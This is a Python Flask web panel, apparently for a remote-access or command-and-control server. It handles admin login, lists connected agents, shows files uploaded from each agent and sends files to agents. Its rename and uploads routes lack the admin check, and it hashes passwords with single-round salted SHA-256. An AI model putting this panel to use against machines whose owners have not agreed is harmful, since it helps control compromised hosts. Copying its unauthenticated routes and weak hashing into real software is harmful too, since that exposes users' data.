import random
import string
from functools import wraps
import hashlib
from datetime import datetime

from flask import Blueprint
from flask import abort
from flask import request
from flask import redirect
from flask import render_template
from flask import session
from flask import url_for
from flask import flash
from flask import send_from_directory
from flask import current_app

from models import db
from models import Agent
from models import Command
from models import User

from werkzeug import secure_filename

import os


def hash_and_salt(password):
    password_hash = hashlib.sha256()
    salt = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
    password_hash.update(salt + request.form['password'])
    return password_hash.hexdigest(), salt


def require_admin(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        if 'username' in session and session['username'] == 'admin':
            return func(*args, **kwargs)
        else:
            return redirect(url_for('webui.login'))
    return wrapper


webui = Blueprint('webui', __name__, static_folder='static', static_url_path='/static/webui', template_folder='templates')


@webui.route('/')
@require_admin
def index():
    return render_template('index.html')


@webui.route('/login', methods=['GET', 'POST'])
def login():
    admin_user = User.query.filter_by(username='admin').first()
    if not admin_user:
        if request.method == 'POST':
            if 'password' in request.form:
                password_hash, salt = hash_and_salt(request.form['password']) 
                new_user = User()
                new_user.username = 'admin'
                new_user.password = password_hash
                new_user.salt = salt
                db.session.add(new_user)
                db.session.commit()
                flash('Password set successfully. Please log in.')
                return redirect(url_for('webui.login'))
        return render_template('create_password.html')
    if request.method == 'POST':
        if request.form['password']:
                password_hash = hashlib.sha256()
                password_hash.update(admin_user.salt + request.form['password'])
                if admin_user.password == password_hash.hexdigest():
                    session['username'] = 'admin'
                    last_login_time =  admin_user.last_login_time
                    last_login_ip = admin_user.last_login_ip
                    admin_user.last_login_time = datetime.now()
                    admin_user.last_login_ip = request.remote_addr
                    db.session.commit()
                    flash('Logged in successfully.') 
                    if last_login_ip:
                        flash('Last login from ' + last_login_ip + ' on ' + last_login_time.strftime("%d/%m/%y %H:%M"))
                    return redirect(url_for('webui.index'))
                else:
                    flash('Wrong passphrase')
    return render_template('login.html')


@webui.route('/passchange', methods=['GET', 'POST'])
@require_admin
def change_password():
    if request.method == 'POST':
        if 'password' in request.form:
            admin_user = User.query.filter_by(username='admin').first()
            password_hash, salt = hash_and_salt(request.form['password'])
            admin_user.password = password_hash
            admin_user.salt = salt
            db.session.add(admin_user)
            db.session.commit()
            flash('Password reset successfully. Please log in.')
            return redirect(url_for('webui.login'))
    return render_template('create_password.html')


@webui.route('/logout')
def logout():
    session.pop('username', None)
    flash('Logged out successfully.')
    return redirect(url_for('webui.login'))


@webui.route('/agents')
@require_admin
def agent_list():
    agents = Agent.query.order_by(Agent.last_online.desc())
    return render_template('agent_list.html', agents=agents)


@webui.route('/agents/<agent_id>')
@require_admin
def agent_detail(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)

    # FileList
    path = os.path.dirname(os.path.dirname(__file__))
    myfiles = os.path.join(path, 'uploads/' + agent_id + '/')

    # If it's a new Agent, have to create folder first
    if not os.path.exists(myfiles):
        os.makedirs(myfiles)

    os.chdir(myfiles)
    x = 0
    d = {}
    files = sorted(os.listdir(os.getcwd()), key=os.path.getmtime) # Ordered by time creation

    for file in reversed(files):
        if not os.path.isdir(file): # Not folders
            d[x] = (myfiles + file)
            x = x + 1

    os.chdir(path)

    return render_template('agent_detail.html', agent=agent, filelist=d)


@webui.route('/agents/rename', methods=['POST'])
def rename_agent():
    if 'newname' in request.form and 'id' in request.form:
        agent = Agent.query.get(request.form['id'])
        if not agent:
            abort(404)
        agent.rename(request.form['newname'])
    else:
        abort(400)
    return ''


@webui.route('/uploads/<path:path>')
def uploads(path):
    return send_from_directory(current_app.config['UPLOAD_FOLDER'], path)

# This uploads the file that you want to send to the Agent.
# For sending the file we have to locate it in a URL for downloading then
# So now, we can Drag & Drop files to the File Input and send directly
@webui.route('/sendfile/<agent_id>', methods=['GET', 'POST'])
@require_admin
def upload_file(agent_id):
    UPLOAD_DIRECTORY = 'uploads/'
    if request.method == 'POST':
        file = request.files['file']
        if file:
            agent_dir = os.path.join(UPLOAD_DIRECTORY, agent_id)
            updir = os.path.join(agent_dir, 'sentfiles')
            if not os.path.exists(updir):
                os.makedirs(updir)
            filename = secure_filename(file.filename)
            full_path = os.path.join(updir, filename)
            file.save(full_path)
            return full_path
    return "Error uploading file"
